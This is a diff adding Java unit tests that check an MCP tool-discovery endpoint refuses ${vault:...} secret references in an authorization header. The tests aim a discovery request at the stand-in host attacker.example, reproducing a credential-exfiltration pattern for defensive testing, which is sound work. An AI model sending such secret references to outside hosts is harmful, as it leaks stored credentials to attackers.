@@ -141,6 +141,36 @@ class RestMcpCallsStoreTest {
             assertTrue(String.valueOf(response.getEntity()).contains("URL targets a blocked address"), String.valueOf(response.getEntity()));
         }
 
+        /**
+         * Security review 2026-10-17, H1: the probe connects to a URL the caller chose,
+         * so resolving a vault reference from the header sent the secret's plaintext to
+         * any editor's host. The probe must refuse before the manager ever sees the
+         * configuration.
+         */
+        @Test
+        @DisplayName("a ${vault:…} reference in X-Mcp-Authorization is refused, never resolved")
+        void vaultReferenceInHeaderIsRefused() {
+            for (String header : List.of("${vault:openai-prod}", "Bearer ${vault:default/openai-prod}", "${eddivault:legacy}",
+                    "${vars:holds-a-vault-reference}")) {
+                Response response = restStore.discoverTools(new McpToolDiscoveryRequest("https://attacker.example/mcp", "http"), header);
+
+                assertEquals(400, response.getStatus(), header);
+                assertTrue(String.valueOf(response.getEntity()).contains("not resolved on a discovery probe"), header);
+            }
+            verifyNoInteractions(mcpToolProviderManager);
+        }
+
+        @Test
+        @DisplayName("a literal credential in X-Mcp-Authorization still reaches the probe")
+        void literalCredentialIsProbed() {
+            when(mcpToolProviderManager.discoverTools(any())).thenReturn(new McpToolProviderManager.McpToolsResult(List.of(), Map.of(), List.of()));
+
+            Response response = restStore.discoverTools(new McpToolDiscoveryRequest("https://mcp.example/mcp", "http"), "literal-token");
+
+            assertEquals(200, response.getStatus());
+            verify(mcpToolProviderManager).discoverTools(argThat(configs -> "literal-token".equals(configs.getFirst().getApiKey())));
+        }
+
         @Test
         @DisplayName("should return BAD_GATEWAY on connection failure")
         void connectionFailure() throws Exception {
